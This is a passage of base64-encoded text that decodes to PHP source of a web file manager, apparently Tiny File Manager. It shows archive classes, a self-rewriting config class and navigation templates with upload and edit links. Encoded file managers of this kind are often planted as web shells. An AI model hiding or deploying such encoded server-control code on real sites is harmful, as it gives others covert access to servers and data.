YWRkRmlsZSgkZmlsZW5hbWUpOw0KICAgICAgICB9IGVsc2VpZiAoaXNfZGlyKCRmaWxlbmFtZSkpIHsNCiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+YWRkRGlyKCRmaWxlbmFtZSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEFkZCBmb2xkZXIgcmVjdXJzaXZlbHkNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoDQogICAgICogQHJldHVybiBib29sDQogICAgICovDQogICAgcHJpdmF0ZSBmdW5jdGlvbiBhZGREaXIoJHBhdGgpDQogICAgew0KICAgICAgICBpZiAoISR0aGlzLT56aXAtPmFkZEVtcHR5RGlyKCRwYXRoKSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICRvYmplY3RzID0gc2NhbmRpcigkcGF0aCk7DQogICAgICAgIGlmIChpc19hcnJheSgkb2JqZWN0cykpIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRmaWxlKSB7DQogICAgICAgICAgICAgICAgaWYgKCRmaWxlICE9ICcuJyAmJiAkZmlsZSAhPSAnLi4nKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChpc19kaXIoJHBhdGggLiAnLycgLiAkZmlsZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPmFkZERpcigkcGF0aCAuICcvJyAuICRmaWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKGlzX2ZpbGUoJHBhdGggLiAnLycgLiAkZmlsZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnppcC0+YWRkRmlsZSgkcGF0aCAuICcvJyAuICRmaWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQp9DQoNCi8qKg0KICogQ2xhc3MgdG8gd29yayB3aXRoIFRhciBmaWxlcyAodXNpbmcgUGhhckRhdGEpDQogKi8NCmNsYXNzIEZNX1ppcHBlcl9UYXINCnsNCiAgICBwcml2YXRlICR0YXI7DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKQ0KICAgIHsNCiAgICAgICAgJHRoaXMtPnRhciA9IG51bGw7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQ3JlYXRlIGFyY2hpdmUgd2l0aCBuYW1lICRmaWxlbmFtZSBhbmQgZmlsZXMgJGZpbGVzIChSRUxBVElWRSBQQVRIUyEpDQogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUNCiAgICAgKiBAcGFyYW0gYXJyYXl8c3RyaW5nICRmaWxlcw0KICAgICAqIEByZXR1cm4gYm9vbA0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBjcmVhdGUoJGZpbGVuYW1lLCAkZmlsZXMpDQogICAgew0KICAgICAgICAkdGhpcy0+dGFyID0gbmV3IFBoYXJEYXRhKCRmaWxlbmFtZSk7DQogICAgICAgIGlmIChpc19hcnJheSgkZmlsZXMpKSB7DQogICAgICAgICAgICBmb3JlYWNoICgkZmlsZXMgYXMgJGYpIHsNCiAgICAgICAgICAgICAgICAkZiA9IGZtX2NsZWFuX3BhdGgoJGYpOw0KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPmFkZEZpbGVPckRpcigkZikpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaWYgKCR0aGlzLT5hZGRGaWxlT3JEaXIoJGZpbGVzKSkgew0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgLyoqDQogICAgICogRXh0cmFjdCBhcmNoaXZlICRmaWxlbmFtZSB0byBmb2xkZXIgJHBhdGggKFJFTEFUSVZFIE9SIEFCU09MVVRFIFBBVEhTKQ0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lDQogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aA0KICAgICAqIEByZXR1cm4gYm9vbA0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiB1bnppcCgkZmlsZW5hbWUsICRwYXRoKQ0KICAgIHsNCiAgICAgICAgJHJlcyA9ICR0aGlzLT50YXItPm9wZW4oJGZpbGVuYW1lKTsNCiAgICAgICAgaWYgKCRyZXMgIT09IHRydWUpIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHRoaXMtPnRhci0+ZXh0cmFjdFRvKCRwYXRoKSkgew0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEFkZCBmaWxlL2ZvbGRlciB0byBhcmNoaXZlDQogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUNCiAgICAgKiBAcmV0dXJuIGJvb2wNCiAgICAgKi8NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGFkZEZpbGVPckRpcigkZmlsZW5hbWUpDQogICAgew0KICAgICAgICBpZiAoaXNfZmlsZSgkZmlsZW5hbWUpKSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICR0aGlzLT50YXItPmFkZEZpbGUoJGZpbGVuYW1lKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlaWYgKGlzX2RpcigkZmlsZW5hbWUpKSB7DQogICAgICAgICAgICByZXR1cm4gJHRoaXMtPmFkZERpcigkZmlsZW5hbWUpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBBZGQgZm9sZGVyIHJlY3Vyc2l2ZWx5DQogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aA0KICAgICAqIEByZXR1cm4gYm9vbA0KICAgICAqLw0KICAgIHByaXZhdGUgZnVuY3Rpb24gYWRkRGlyKCRwYXRoKQ0KICAgIHsNCiAgICAgICAgJG9iamVjdHMgPSBzY2FuZGlyKCRwYXRoKTsNCiAgICAgICAgaWYgKGlzX2FycmF5KCRvYmplY3RzKSkgew0KICAgICAgICAgICAgZm9yZWFjaCAoJG9iamVjdHMgYXMgJGZpbGUpIHsNCiAgICAgICAgICAgICAgICBpZiAoJGZpbGUgIT0gJy4nICYmICRmaWxlICE9ICcuLicpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGlzX2RpcigkcGF0aCAuICcvJyAuICRmaWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+YWRkRGlyKCRwYXRoIC4gJy8nIC4gJGZpbGUpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoaXNfZmlsZSgkcGF0aCAuICcvJyAuICRmaWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+dGFyLT5hZGRGaWxlKCRwYXRoIC4gJy8nIC4gJGZpbGUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCn0NCg0KLyoqDQogKiBTYXZlIENvbmZpZ3VyYXRpb24NCiAqLw0KIGNsYXNzIEZNX0NvbmZpZw0Kew0KICAgICB2YXIgJGRhdGE7DQoNCiAgICBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpDQogICAgew0KICAgICAgICBnbG9iYWwgJHJvb3RfcGF0aCwgJHJvb3RfdXJsLCAkQ09ORklHOw0KICAgICAgICAkZm1fdXJsID0gJHJvb3RfdXJsLiRfU0VSVkVSWyJQSFBfU0VMRiJdOw0KICAgICAgICAkdGhpcy0+ZGF0YSA9IGFycmF5KA0KICAgICAgICAgICAgJ2xhbmcnID0+ICdlbicsDQogICAgICAgICAgICAnZXJyb3JfcmVwb3J0aW5nJyA9PiB0cnVlLA0KICAgICAgICAgICAgJ3Nob3dfaGlkZGVuJyA9PiB0cnVlDQogICAgICAgICk7DQogICAgICAgICRkYXRhID0gZmFsc2U7DQogICAgICAgIGlmIChzdHJsZW4oJENPTkZJRykpIHsNCiAgICAgICAgICAgICRkYXRhID0gZm1fb2JqZWN0X3RvX2FycmF5KGpzb25fZGVjb2RlKCRDT05GSUcpKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRtc2cgPSAnVGlueSBGaWxlIE1hbmFnZXI8YnI+RXJyb3I6IENhbm5vdCBsb2FkIGNvbmZpZ3VyYXRpb24nOw0KICAgICAgICAgICAgaWYgKHN1YnN0cigkZm1fdXJsLCAtMSkgPT0gJy8nKSB7DQogICAgICAgICAgICAgICAgJGZtX3VybCA9IHJ0cmltKCRmbV91cmwsICcvJyk7DQogICAgICAgICAgICAgICAgJG1zZyAuPSAnPGJyPic7DQogICAgICAgICAgICAgICAgJG1zZyAuPSAnPGJyPlNlZW1zIGxpa2UgeW91IGhhdmUgYSB0cmFpbGluZyBzbGFzaCBvbiB0aGUgVVJMLic7DQogICAgICAgICAgICAgICAgJG1zZyAuPSAnPGJyPlRyeSB0aGlzIGxpbms6IDxhIGhyZWY9IicgLiAkZm1fdXJsIC4gJyI+JyAuICRmbV91cmwgLiAnPC9hPic7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBkaWUoJG1zZyk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzX2FycmF5KCRkYXRhKSAmJiBjb3VudCgkZGF0YSkpICR0aGlzLT5kYXRhID0gJGRhdGE7DQogICAgICAgIGVsc2UgJHRoaXMtPnNhdmUoKTsNCiAgICB9DQoNCiAgICBmdW5jdGlvbiBzYXZlKCkNCiAgICB7DQogICAgICAgICRmbV9maWxlID0gX19GSUxFX187DQogICAgICAgICR2YXJfbmFtZSA9ICckQ09ORklHJzsNCiAgICAgICAgJHZhcl92YWx1ZSA9IHZhcl9leHBvcnQoanNvbl9lbmNvZGUoJHRoaXMtPmRhdGEpLCB0cnVlKTsNCiAgICAgICAgJGNvbmZpZ19zdHJpbmcgPSAiPD9waHAiIC4gY2hyKDEzKSAuIGNocigxMCkgLiAiLy9EZWZhdWx0IENvbmZpZ3VyYXRpb24iLmNocigxMykgLiBjaHIoMTApLiIkdmFyX25hbWUgPSAkdmFyX3ZhbHVlOyIgLiBjaHIoMTMpIC4gY2hyKDEwKTsNCiAgICAgICAgaWYgKGlzX3dyaXRhYmxlKCRmbV9maWxlKSkgew0KICAgICAgICAgICAgJGxpbmVzID0gZmlsZSgkZm1fZmlsZSk7DQogICAgICAgICAgICBpZiAoJGZoID0gQGZvcGVuKCRmbV9maWxlLCAidyIpKSB7DQogICAgICAgICAgICAgICAgQGZwdXRzKCRmaCwgJGNvbmZpZ19zdHJpbmcsIHN0cmxlbigkY29uZmlnX3N0cmluZykpOw0KICAgICAgICAgICAgICAgIGZvciAoJHggPSAzOyAkeCA8IGNvdW50KCRsaW5lcyk7ICR4KyspIHsNCiAgICAgICAgICAgICAgICAgICAgQGZwdXRzKCRmaCwgJGxpbmVzWyR4XSwgc3RybGVuKCRsaW5lc1skeF0pKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgQGZjbG9zZSgkZmgpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0KDQovLy0tLSBUZW1wbGF0ZXMgRnVuY3Rpb25zIC0tLQ0KDQovKioNCiAqIFNob3cgbmF2IGJsb2NrDQogKiBAcGFyYW0gc3RyaW5nICRwYXRoDQogKi8NCmZ1bmN0aW9uIGZtX3Nob3dfbmF2X3BhdGgoJHBhdGgpDQp7DQogICAgZ2xvYmFsICRsYW5nLCAkc3RpY2t5X25hdmJhciwgJGVkaXRGaWxlOw0KICAgICRpc1N0aWNreU5hdkJhciA9ICRzdGlja3lfbmF2YmFyID8gJ2ZpeGVkLXRvcCcgOiAnJzsNCiAgICAkZ2V0VGhlbWUgPSBmbV9nZXRfdGhlbWUoKTsNCiAgICAkZ2V0VGhlbWUgLj0gIiBuYXZiYXItbGlnaHQiOw0KICAgIGlmKEZNX1RIRU1FID09ICJkYXJrIikgew0KICAgICAgICAkZ2V0VGhlbWUgLj0gIiBuYXZiYXItZGFyayI7DQogICAgfSBlbHNlIHsNCiAgICAgICAgJGdldFRoZW1lIC49ICIgYmctd2hpdGUiOw0KICAgIH0NCiAgICA/Pg0KICAgIDxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItZXhwYW5kLWxnIDw/cGhwIGVjaG8gJGdldFRoZW1lOyA/PiBtYi00IG1haW4tbmF2IDw/cGhwIGVjaG8gJGlzU3RpY2t5TmF2QmFyID8+Ij4NCiAgICAgICAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCI+IDw/cGhwIGVjaG8gbG5nKCdBcHBUaXRsZScpID8+IDwvYT4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibmF2YmFyLXRvZ2dsZXIiIHR5cGU9ImJ1dHRvbiIgZGF0YS1icy10b2dnbGU9ImNvbGxhcHNlIiBkYXRhLWJzLXRhcmdldD0iI25hdmJhclN1cHBvcnRlZENvbnRlbnQiIGFyaWEtY29udHJvbHM9Im5hdmJhclN1cHBvcnRlZENvbnRlbnQiIGFyaWEtZXhwYW5kZWQ9ImZhbHNlIiBhcmlhLWxhYmVsPSJUb2dnbGUgbmF2aWdhdGlvbiI+DQogICAgICAgICAgICA8c3BhbiBjbGFzcz0ibmF2YmFyLXRvZ2dsZXItaWNvbiI+PC9zcGFuPg0KICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgPGRpdiBjbGFzcz0iY29sbGFwc2UgbmF2YmFyLWNvbGxhcHNlIiBpZD0ibmF2YmFyU3VwcG9ydGVkQ29udGVudCI+DQoNCiAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICAkcGF0aCA9IGZtX2NsZWFuX3BhdGgoJHBhdGgpOw0KICAgICAgICAgICAgJHJvb3RfdXJsID0gIjxhIGhyZWY9Jz9wPSc+PGkgY2xhc3M9J2ZhIGZhLWhvbWUnIGFyaWEtaGlkZGVuPSd0cnVlJyB0aXRsZT0nIiAuIEZNX1JPT1RfUEFUSCAuICInPjwvaT48L2E+IjsNCiAgICAgICAgICAgICRzZXAgPSAnPGkgY2xhc3M9ImJyZWFkLWNydW1iIj4gLyA8L2k+JzsNCiAgICAgICAgICAgIGlmICgkcGF0aCAhPSAnJykgew0KICAgICAgICAgICAgICAgICRleHBsb2RlZCA9IGV4cGxvZGUoJy8nLCAkcGF0aCk7DQogICAgICAgICAgICAgICAgJGNvdW50ID0gY291bnQoJGV4cGxvZGVkKTsNCiAgICAgICAgICAgICAgICAkYXJyYXkgPSBhcnJheSgpOw0KICAgICAgICAgICAgICAgICRwYXJlbnQgPSAnJzsNCiAgICAgICAgICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCAkY291bnQ7ICRpKyspIHsNCiAgICAgICAgICAgICAgICAgICAgJHBhcmVudCA9IHRyaW0oJHBhcmVudCAuICcvJyAuICRleHBsb2RlZFskaV0sICcvJyk7DQogICAgICAgICAgICAgICAgICAgICRwYXJlbnRfZW5jID0gdXJsZW5jb2RlKCRwYXJlbnQpOw0KICAgICAgICAgICAgICAgICAgICAkYXJyYXlbXSA9ICI8YSBocmVmPSc/cD17JHBhcmVudF9lbmN9Jz4iIC4gZm1fZW5jKGZtX2NvbnZlcnRfd2luKCRleHBsb2RlZFskaV0pKSAuICI8L2E+IjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHJvb3RfdXJsIC49ICRzZXAgLiBpbXBsb2RlKCRzZXAsICRhcnJheSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlY2hvICc8ZGl2IGNsYXNzPSJjb2wteHMtNiBjb2wtc20tNSI+JyAuICRyb290X3VybCAuICRlZGl0RmlsZSAuICc8L2Rpdj4nOw0KICAgICAgICAgICAgPz4NCg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTYgY29sLXNtLTciPg0KICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibmF2YmFyLW5hdiBqdXN0aWZ5LWNvbnRlbnQtZW5kIDw/cGhwIGVjaG8gZm1fZ2V0X3RoZW1lKCk7ICA/PiI+DQogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gbXItMiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCBpbnB1dC1ncm91cC1zbSBtci0xIiBzdHlsZT0ibWFyZ2luLXRvcDo0cHg7Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCIgcGxhY2Vob2xkZXI9Ijw/cGhwIGVjaG8gbG5nKCdTZWFyY2gnKSA/PiIgYXJpYS1sYWJlbD0iPD9waHAgZWNobyBsbmcoJ1NlYXJjaCcpID8+IiBhcmlhLWRlc2NyaWJlZGJ5PSJzZWFyY2gtYWRkb24yIiBpZD0ic2VhcmNoLWFkZG9uIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cC1hcHBlbmQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iaW5wdXQtZ3JvdXAtdGV4dCBicmwtMCBicnItMCIgaWQ9InNlYXJjaC1hZGRvbjIiPjxpIGNsYXNzPSJmYSBmYS1zZWFyY2giPjwvaT48L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAtYXBwZW5kIGJ0bi1ncm91cCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbnB1dC1ncm91cC10ZXh0IGRyb3Bkb3duLXRvZ2dsZSBicmwtMCIgZGF0YS1icy10b2dnbGU9ImRyb3Bkb3duIiBhcmlhLWhhc3BvcHVwPSJ0cnVlIiBhcmlhLWV4cGFuZGVkPSJmYWxzZSI+PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRyb3Bkb3duLW1lbnUgZHJvcGRvd24tbWVudS1yaWdodCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iZHJvcGRvd24taXRlbSIgaHJlZj0iPD9waHAgZWNobyAkcGF0aDIgPSAkcGF0aCA/ICRwYXRoIDogJy4nOyA/PiIgaWQ9ImpzLXNlYXJjaC1tb2RhbCIgZGF0YS1icy10b2dnbGU9Im1vZGFsIiBkYXRhLWJzLXRhcmdldD0iI3NlYXJjaE1vZGFsIj48P3BocCBlY2hvIGxuZygnQWR2YW5jZWQgU2VhcmNoJykgPz48L2E+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9saT4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+DQogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdVcGxvYWQnKSA/PiIgY2xhc3M9Im5hdi1saW5rIiBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7dXBsb2FkIj48aSBjbGFzcz0iZmEgZmEtY2xvdWQtdXBsb2FkIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnVXBsb2FkJykgPz48L2E+DQogICAgICAgICAgICAgICAgICAgIDwvbGk+DQogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdOZXdJdGVtJykgPz4iIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iI2NyZWF0ZU5ld0l0ZW0iIGRhdGEtYnMtdG9nZ2xlPSJtb2RhbCIgZGF0YS1icy10YXJnZXQ9IiNjcmVhdGVOZXdJdGVtIj48aSBjbGFzcz0iZmEgZmEtcGx1cy1zcXVhcmUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ05ld0l0ZW0nKSA/PjwvYT4NCiAgICAgICAgICAgICAgICAgICAgPC9saT4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmIChGTV9VU0VfQVVUSCk6ID8+DQogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gYXZhdGFyIGRyb3Bkb3duIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBkcm9wZG93bi10b2dnbGUiIGlkPSJuYXZiYXJEcm9wZG93bk1lbnVMaW5rLTUiIGRhdGEtYnMtdG9nZ2xlPSJkcm9wZG93biIgYXJpYS1oYXNwb3B1cD0idHJ1ZSIgYXJpYS1leHBhbmRlZD0iZmFsc2UiPiA8aSBjbGFzcz0iZmEgZmEtdXNlci1jaXJjbGUiPjwvaT4gPD9waHAgaWYoaXNzZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXSkpIHsgZWNobyAkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddOyB9ID8+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZHJvcGRvd24tbWVudSB0ZXh0LXNtYWxsIHNoYWRvdyA8P3BocCBlY2hvIGZtX2dldF90aGVtZSgpOyA/PiIgYXJpYS1sYWJlbGxlZGJ5PSJuYXZiYXJEcm9wZG93bk1lbnVMaW5rLTUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnU2V0dGluZ3MnKSA/PiIgY2xhc3M9ImRyb3Bkb3duLWl0ZW0gbmF2LWxpbmsiIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpID8+JmFtcDtzZXR0aW5ncz0xIj48aSBjbGFzcz0iZmEgZmEtY29nIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnU2V0dGluZ3MnKSA/PjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnSGVscCcpID8+IiBjbGFzcz0iZHJvcGRvd24taXRlbSBuYXYtbGluayIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2hlbHA9MiI+PGkgY2xhc3M9ImZhIGZhLWV4Y2xhbWF0aW9uLWNpcmNsZSIgYXJpYS1oaWRkZW49InRydWUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0hlbHAnKSA/PjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0xvZ291dCcpID8+IiBjbGFzcz0iZHJvcGRvd24taXRlbSBuYXYtbGluayIgaHJlZj0iP2xvZ291dD0xIj48aSBjbGFzcz0iZmEgZmEtc2lnbi1vdXQiIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdMb2dvdXQnKSA/PjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2xpPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBlbHNlOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnU2V0dGluZ3MnKSA/PiIgY2xhc3M9ImRyb3Bkb3duLWl0ZW0gbmF2LWxpbmsiIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpID8+JmFtcDtzZXR0aW5ncz0xIj48aSBjbGFzcz0iZmEgZmEtY29nIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnU2V0dGluZ3MnKSA/PjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2xpPg0KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgIDw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICAgICAgICAgIDwvdWw+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9uYXY+DQogICAgPD9waHANCn0NCg0KLyoqDQogKiBTaG93IGFsZXJ0IG1lc3NhZ2UgZnJvbSBzZXNzaW9uDQogKi8NCmZ1bmN0aW9uIGZtX3Nob3dfbWVzc2FnZSgpDQp7DQogICAgaWYgKGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbWVzc2FnZSddKSkgew0KICAgICAgICAkY2xhc3MgPSBpc3NldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ3N0YXR1cyddKSA/ICRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnc3RhdHVzJ10gOiAnb2snOw0KICAgICAgICBlY2hvICc8cCBjbGFzcz0ibWVzc2FnZSAnIC4gJGNsYXNzIC4gJyI+JyAuICRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbWVzc2FnZSddIC4gJzwvcD4nOw0KICAgICAgICB1bnNldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ21lc3NhZ2UnXSk7DQogICAgICAgIHVuc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnc3RhdHVzJ10pOw0KICAgIH0NCn0NCg0KLyoqDQogKiBTaG93IHBhZ2UgaGVhZGVyIGluIExvZ2luIEZvcm0NCiAqLw0KZnVuY3Rpb24gZm1fc2hvd19oZWFkZXJfbG9naW4oKQ0Kew0KJHNwcml0ZXNfdmVyID0gJzIwMTYwMzE1JzsNCmhlYWRlcigiQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiKTsNCmhlYWRlcigiRXhwaXJlczogU2F0LCAyNiBKdWwgMTk5NyAwNTowMDowMCBHTVQiKTsNCmhlYWRlcigiQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUsIHBvc3QtY2hlY2s9MCwgcHJlLWNoZWNrPTAiKTsNCmhlYWRlcigiUHJhZ21hOiBuby1jYWNoZSIpOw0KDQpnbG9iYWwgJGxhbmcsICRyb290X3VybCwgJGZhdmljb25fcGF0aDsNCj8+DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCj